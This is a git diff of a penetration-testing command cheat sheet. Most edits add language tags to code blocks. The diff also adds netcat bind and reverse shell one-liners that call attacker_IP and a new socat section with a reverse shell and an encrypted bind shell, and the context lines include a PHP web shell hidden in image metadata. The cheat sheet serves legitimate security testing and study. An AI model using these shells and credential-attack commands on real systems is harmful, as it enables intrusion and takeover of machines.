@@ -30,7 +30,7 @@ Welcome to [@muemmelmoehre](https://github.com/muemmelmoehre){:target="blank"}'s
 
 
 ## ADB
-```
+```bash
 # list devices
 adb devices
 adb devices -l
@@ -121,7 +121,7 @@ content update --uri content://uri_here --bind column_name_here:type_here:value_
 
 
 ## AMASS
-```
+```bash
 # subdomain enumeration
 /path/to/amass enum -d domain_here > outfile_here
 
@@ -135,7 +135,7 @@ content update --uri content://uri_here --bind column_name_here:type_here:value_
 
 
 ## APACHE2
-```
+```bash
 # start service
 sudo systemcctl start apache2
 
@@ -158,7 +158,7 @@ sudo apache2 -f /path/to/file/here
 
 
 ## APKTOOL
-```
+```bash
 # decode apk
 apktool d /path/to/apk
 
@@ -169,7 +169,7 @@ apktool b /path/to/appfolder
 
 
 ## APT
-```
+```bash
 # search for package in cached database
 apt-cache search package_here
 
@@ -186,7 +186,7 @@ apt remove --purge package_here
 
 
 ## AWK
-```
+```bash
 # specify field separator + output text
 awk -F "separator_here" '{print $no_element_here}'
 
@@ -197,7 +197,7 @@ echo "some::stuff::here" | awk -F "::" '{print $1, $3}'
 
 
 ## AXEL
-```
+```bash
 # download file from FTP / HTTP(S) with X simultaneous connections
 axel -a -n X -o /path/to/outfile url_here
 ```
@@ -486,7 +486,7 @@ which file_name_here
 
 
 ## CERTUTIL
-```
+```powershell
 # download file
 certutil -urlcache -split -f url_to_web_file /path/to/out/file
 ```
@@ -494,7 +494,7 @@ certutil -urlcache -split -f url_to_web_file /path/to/out/file
 
 
 ## CEWL
-```
+```bash
 # create a wordlist from URL
 cewl -w /path/to/outfile.txt -v URL_here
 ```
@@ -502,7 +502,7 @@ cewl -w /path/to/outfile.txt -v URL_here
 
 
 ## CHECKSEC
-```
+```bash
 # check flags on binary
 checksec file_name_here
 ```
@@ -510,7 +510,7 @@ checksec file_name_here
 
 
 ## CMD
-```
+```powershell
 # clear screen
 cls
 
@@ -578,7 +578,7 @@ taskkill /im:process_name_here /f
 
 
 ## COMPGEN
-```
+```bash
 # show help
 help compgen
 
@@ -622,7 +622,7 @@ compgen -v
 
 
 ## CRACKMAPEXEC
-```
+```bash
 # check for password policy on Windows domain
 crackmapexec protocol_here IP_here --pass-pol -u '' -p ''
 
@@ -636,7 +636,7 @@ crackmapexec smb IP_here -u user -p password -M spider_plus
 
 
 ## CURL
-```
+```bash
 # basic syntax
 curl "protocol_here://url_here"
 
@@ -659,7 +659,7 @@ curl -O /path/to/outfile url_here
 
 
 ## CUT
-```
+```bash
 # extract 2nd field, fields delimited by ","
 echo "some enumeration of stuff, more stuff, even more stuff" | cut -f 2 -d ","
 
@@ -670,7 +670,7 @@ cut -f no_here -d "delimiter_here" /path/to/file
 
 
 ## DAVTEST
-```
+```bash
 # check permissions on exposed WebDAV endpoint
 davtest -url http://endpoint_URL_here
 ```
@@ -678,7 +678,7 @@ davtest -url http://endpoint_URL_here
 
 
 ## DEX2JAR
-```
+```bash
 # convert apk to jar
 d2j-dex2jar /path/to/apk -o outfile.jar
 ```
@@ -686,7 +686,7 @@ d2j-dex2jar /path/to/apk -o outfile.jar
 
 
 ## DIG
-```
+```bash
 # print public IP
 dig +short myip.opendns.com @resolver1.opendns.com
 ```
@@ -694,7 +694,7 @@ dig +short myip.opendns.com @resolver1.opendns.com
 
 
 ## DNSRECON
-```
+```bash
 # find hostname
 dnsrecon -d domain_here -r range_here
 ```
@@ -702,7 +702,7 @@ dnsrecon -d domain_here -r range_here
 
 
 ## DOCKER
-```
+```bash
 # show available containers
 docker ps
 
@@ -713,7 +713,7 @@ docker exec -it container_ID_here /bin/bash
 
 
 ## DOS2UNIX / UNIX2DOS
-```
+```bash
 # convert text files from DOS to Unix (CR/LF -> LF)
 dos2unix filename
 dos2unix filename -n new_file
@@ -726,7 +726,7 @@ unix2dos filename -n new_file
 
 
 ## DPKG
-```
+```bash
 # install local package
 dpkg -i /path/to/.deb
 ```
@@ -734,7 +734,7 @@ dpkg -i /path/to/.deb
 
 
 ## DRUPAL
-```
+```bash
 # droopescan
 droopescan scan drupal -u IP_here
 ```
@@ -742,7 +742,7 @@ droopescan scan drupal -u IP_here
 
 
 ## ENV
-```
+```bash
 # show all environment variables
 env
 
@@ -756,7 +756,7 @@ echo $VARIABLE_HERE
 
 
 ## EVIL-WINRM
-```
+```bash
 # get shell on IP_here as user
 evil-winrm -i IP_here -u user -p password 
 ```
@@ -764,7 +764,7 @@ evil-winrm -i IP_here -u user -p password
 
 
 ## EXIFTOOL
-```
+```bash
 # add php web shell to image
 exiftool -Comment='<?php system($_GET['cmd']); ?>' /path/to/image/here
 # call shell
@@ -774,7 +774,7 @@ http://upload_url_here/file_name_here?cmd=command_here
 
 
 ## FFUF
-```
+```bash
 # enumerate files
 ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.html
 ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ.php 
@@ -799,7 +799,7 @@ ffuf -w /path/to/wordlist.txt -u http://URL_here/FUZZ -b "cookie_here=value_here
 
 
 ## FLAMESHOT
-```
+```bash
 # start flameshot
 flameshot gui
 
@@ -825,7 +825,7 @@ flameshot full -c
 
 
 ## FPING
-```
+```bash
 # ping sweep
 fping -a -g IP_range 2>/dev/null
 ```
@@ -833,7 +833,7 @@ fping -a -g IP_range 2>/dev/null
 
 
 ## FTP
-```
+```bash
 # connect
 ftp IP_here
 
@@ -853,7 +853,7 @@ rename old_file_name new_file_name
 
 
 ## GIT
-```
+```bash
 # list branches
 git branch
 
@@ -869,7 +869,7 @@ git stash pop
 
 
 ## GOBUSTER
-```
+```bash
 # enumerate web folders
 gobuster dir -u http://IP_here -w /path/to/wordlist.txt -o root-dir
 
@@ -892,7 +892,7 @@ fmt.Println("Printing ", some_string, "and ", some_other_string, ".")
 
 
 ## GOOGLE DORKS
-```
+```bash
 # URL
 inurl:(extension_here|other_extension_here)
 
@@ -919,7 +919,7 @@ OR
 
 
 ## GPP-DECRYPT
-```
+```bash
 # decrypt password from group policy preferences
 gpp-decrypt ciphertext_here
 ```
@@ -927,7 +927,7 @@ gpp-decrypt ciphertext_here
 
 
 ## GREP
-```
+```bash
 # grep recursively for search_term_here
 grep -r search_term_here /path/to/search/directory
 
@@ -947,7 +947,7 @@ grep PermitRootLogin /etc/ssh/sshd_config
 
 
 ## HASHCAT
-```
+```bash
 # permute words in wordlist
 hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule
 
@@ -995,7 +995,7 @@ stack exec project_name_here
 
 
 ## HDIUTIL
-```
+```bash
 # attach .dmg
 hdiutil attach /path/to/dmg
 cd /path/to/volume
@@ -1007,7 +1007,7 @@ hdiutil detach /path/to/volume
 
 
 ## HOST
-```
+```bash
 # request name server for domain
 host -t ns url_here
 
@@ -1018,7 +1018,7 @@ host -l url_here name_server_here
 
 
 ## HYDRA
-```
+```bash
 # dictionary attack
 hydra -L users.txt -P passwords.txt <protocol://IP_here> <options>
 hydra -l user_name_here -P /path/to/wordlist <protocol://IP_here> <options>
@@ -1030,7 +1030,7 @@ hydra l user_name_here -p /path/to/wordlist url_here http-form-post "/path/to/lo
 
 
 ## IMPACKET
-```
+```bash
 # get TGT for users with UF_DONT_REQUIRE_PREAUTH
 /path/to/impacket/examples/GetNPUsers.py domain/ -usersfile /path/to/users.txt -no-pass -outputfile /path/to/tgt.txt
 
@@ -1056,7 +1056,7 @@ copy \\IP_attacker\share_name_here\file_name_here
 
 
 ## JARSIGNER
-```
+```bash
 # sign apk :
 # 1. generate private key
 keytool -genkey -v -keystore keystore_here -alias alias_here -keyalg RSA -keysize 2048 -validity 7400
@@ -1070,7 +1070,7 @@ jarsigner -verify -verbose -certs /path/to/apk
 
 
 ## JOHN
-```
+```bash
 # crack password hash - dictionary attack
 john -w=/path/to/wordlist /path/to/hash
 
@@ -1093,7 +1093,7 @@ keepass2john db_here.kdbx
 
 
 ## LDAP
-```
+```bash
 # nmap script
 nmap --script ldap-search IP_here 
 
@@ -1108,7 +1108,7 @@ ldapsearch -x -h IP_here -s base namingcontexts
 
 
 ## LINENUM
-```
+```bash
 # activate thorough tests
 /path/to/linenum.sh -t
 
@@ -1122,7 +1122,7 @@ ldapsearch -x -h IP_here -s base namingcontexts
 
 
 ## LSE
-```
+```bash
 # do not prompt for password
 /path/to/lse.sh -i
 
@@ -1141,7 +1141,7 @@ mongo -u user_here -p password_here IP_here:port_here
 
 
 ## MSFCONSOLE
-```
+```bash
 # import new exploit (Kali)
 wget url_to_raw_ruby_exploit
 cp ruby_exploit /usr/share/metasploit-framework/modules/exploits/path/to/fitting/category/exploit.rb
@@ -1156,7 +1156,7 @@ cp ruby_exploit /opt/metasploit-framework/embedded/framework/modules/exploits/pa
 
 
 ## MSFVENOM
-```
+```bash
 # list available payloads
 msfvenom --list payloads
 
@@ -1286,12 +1286,20 @@ echo $result;
 echo '</pre>';
 }
 ?>
+
+# bind shell to local port
+nc -lnvp port_here -e cmd.exe
+nc -lnvp port_here -e /bin/bash
+
+# push reverse shell
+nc -nv attacker_IP port_here -e cmd.exe
+nc -nv attacker_IP port_here -e /bin/bash
 ```
 
 
 
 ## NET
-```
+```powershell
 # add new user
 net user user_here password_here /add
 
@@ -1317,7 +1325,7 @@ net use \\IP_here\IPC$ '' /u:''
 
 
 ## NIKTO
-```
+```bash
 # scan host / site
 nikto -h host_site_here
 
@@ -1328,7 +1336,7 @@ nikto -h host_site_here -i user_here:password_here
 
 
 ## NMAP
-```
+```bash
 # ping sweep
 nmap -sn IP_range
 nmap -sn -iL IP_list_file_here
@@ -1379,7 +1387,7 @@ nmap -p 443 --script http-methods --script-args http-methods.url-path='/my/path/
 
 
 ## NSLOOKUP
-```
+```bash
 # find hostname of IP_here
 nslookup
 server DNS_IP_here
@@ -1390,7 +1398,7 @@ IP_here
 
 
 ## NTPDATE
-```
+```bash
 # synchronize time of local machine with remote server
 ntpdate remote_server_IP_here
 ```
@@ -1398,7 +1406,7 @@ ntpdate remote_server_IP_here
 
 
 ## OBJDUMP
-```
+```bash
 # disassemble binary
 objdump -d /path/to/binary/here
 ```
@@ -1406,18 +1414,21 @@ objdump -d /path/to/binary/here
 
 
 ## OPENSSL
-```
+```bash
 # banner grabbing (2 empty lines required between headers + body!)
 openssl s_client -connect target_ip:443
 HEAD / HTTP/1.1
 
 
+
+# genereate self-signed cert
+openssl req -newkey rsa:2048 -nodes -keyout myprivkey.key -x509 -days 362 -out mycert.crt
 ```
 
 
 
 ## PANDOC
-```
+```bash
 # convert markdown to pdf
 pandoc -s -o out_file_here.pdf mardown_file_here.md
 ```
@@ -1457,7 +1468,7 @@ pip3 install package
 
 
 ## PIPREQS
-```
+```bash
 # create requirements.txt
 pipreqs
 
@@ -1565,7 +1576,7 @@ with open("file_name_here","mode_here",encoding="encoding_here") as file:
 
 
 ## RADARE2
-```
+```bash
 # open binary in debug mode
 r2 -d /path/to/binary
 
@@ -1604,7 +1615,7 @@ ood
 
 
 ## REG QUERY
-```
+```powershell
 # enumerate registry information, search recursively for password in HKLM
 reg query HKLM /f password /t REG_SZ /s
 
@@ -1615,7 +1626,7 @@ reg query HKCU /f password /t REG_SZ /s
 
 
 ## RPC
-```
+```bash
 # connect anonymously
 rpcclient -U "" IP_here
 
@@ -1641,7 +1652,7 @@ querydispinfo
 
 
 ## RPCBIND
-```
+```bash
 # enumerate rpcbind
 rpcinfo IP_here
 
@@ -1652,7 +1663,7 @@ showmount -e IP_here
 
 
 ## SCP
-```
+```bash
 # copy remote file to local machine
 scp user@IP_here:/path/to/remote/file /path/to/local/file
 
@@ -1669,7 +1680,7 @@ scp -i private_key_here /path/to/local/file user@IP_here:/path/to/remote/file
 
 
 ## SEARCHSPLOIT
-```
+```bash
 # display full path + URL to exploit
 searchsploit -p short_path_here
 
@@ -1686,7 +1697,7 @@ searchsploit -m short_path_here
 
 
 ## SED
-```
+```bash
 # delete spaces from string
 echo "my string with spaces here" | sed -r 's/( )+//g'
 
@@ -1697,7 +1708,7 @@ echo "something with a specific word_here" | sed 's/word_here/new_word_here/'
 
 
 ## SFTP
-```
+```bash
 # connect as user
 sftp -oPort=port user@IP_here
 
@@ -1711,7 +1722,7 @@ get /path/to/remote/file
 
 
 ## SIPVICIOUS
-```
+```bash
 # enumerate SIP servers
 svmap IP_range_here
 
@@ -1722,7 +1733,7 @@ svwar -m INVITE IP_here
 
 
 ## SMB
-```
+```bash
 # enumerate shares with anonymous login
 smbclient -L smb -I IP_here
 
@@ -1776,8 +1787,36 @@ sudo mount -t cifs -o 'user=user_here,password=password_here' //IP_here/share_he
 
 
 
-## SQLITE3
+## SOCAT
+```bash
+# connect to TCP port
+socat -TCP4:target_IP:port_here
+
+# listen
+socat TCP4-LISTEN:port_here STDOUT
+
+# share file
+socat TCP4-LISTEN:port_here,fork file:infile_here
+
+# retrieve file
+socat TCP4:target_IP:port_here file:outfile_here,create
+
+# reverse shell
+# listener
+socat -d -d TCP4-LISTEN:port_here STDOUT
+# push shell
+socat TCP4:attacker_IP:port_here EXEC:/bin/bash
+
+# encrypted bind shell
+# genereate self-signed cert
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+# combine 
 ```
+
+
+
+## SQLITE3
+```bash
 # display database content
 sqlite3 database_here .dump
 .dump
@@ -1804,7 +1843,7 @@ sqlite3 database_here .dump
 
 
 ## SQLMAP
-```
+```python
 # launch sqlmap from a GET / POST request file
 python /path/to/sqlmap -r req.txt -p param_to_attack1,param2,param3
 
@@ -1836,7 +1875,7 @@ python /path/to/sqlmap -r req.txt -p param_to_attack --timeout=300
 
 
 ## SQSH
-```
+```bash
 # connect to SQL database
 sqsh -S IP_here -U user_here -P password_here
 
@@ -1854,7 +1893,7 @@ go
 
 
 ## SSH
-```
+```bash
 # connect as user with password
 ssh user@IP
 
@@ -1883,7 +1922,7 @@ sudo ss -plant | grep ssh
 
 
 ## SVN
-```
+```bash
 # download repository
 svn co svn://url_here
 
@@ -1897,7 +1936,7 @@ svn up -r revision_number_here
 
 
 ## SYSTEMCTL
-```
+```bash
 # start service
 sudo systemcctl start service_name_here
 
@@ -1920,7 +1959,7 @@ sudo systemctl list-unit-files
 
 
 ## TCPDUMP
-```
+```bash
 # list all interfaces
 tcpdump -D
 
@@ -1972,7 +2011,7 @@ Ctrl+w
 
 
 ## VIRTUALENV
-```
+```bash
 # initialize virtual environment
 virtualenv venv
 
@@ -1995,7 +2034,7 @@ del venv
 
 
 ## WGET
-```
+```bash
 # retrieve folders + files from FTP
 wget --mirror 'ftp://user_here:password_here@hostname.domain'
 wget --mirror 'ftp://user_here:password_here@IP_here'
@@ -2008,7 +2047,7 @@ wget -O /path/to/outfile url_here
 
 
 ## WHATWEB
-```
+```bash
 # run scan
 whatweb url_here
 
@@ -2019,7 +2058,7 @@ whatweb -a=3 url_here
 
 
 ## WINEXE
-```
+```powershell
 # get shell on IP_here as user with password
 winexe -U domain_here/user_here%password_here cmd.exe
 
@@ -2030,7 +2069,7 @@ pth-winexe -U domain_here/user_here cmd.exe
 
 
 ## XFREERDP
-```
+```bash
 # establish connection
 xfreerdp /u:user_here /p:password_here /cert:ignore /v:IP_here
 ```
@@ -2038,7 +2077,7 @@ xfreerdp /u:user_here /p:password_here /cert:ignore /v:IP_here
 
 
 ## XXD
-```
+```bash
 # plaintext hexdump
 xxd -p filename_here
 ```
@@ -2046,7 +2085,7 @@ xxd -p filename_here
 
 
 ## 7Z
-```
+```bash
 # extract password-protected archive (special characters in password need to be escaped with \)
 7z e archive_here.zip -ppassword_here 
 
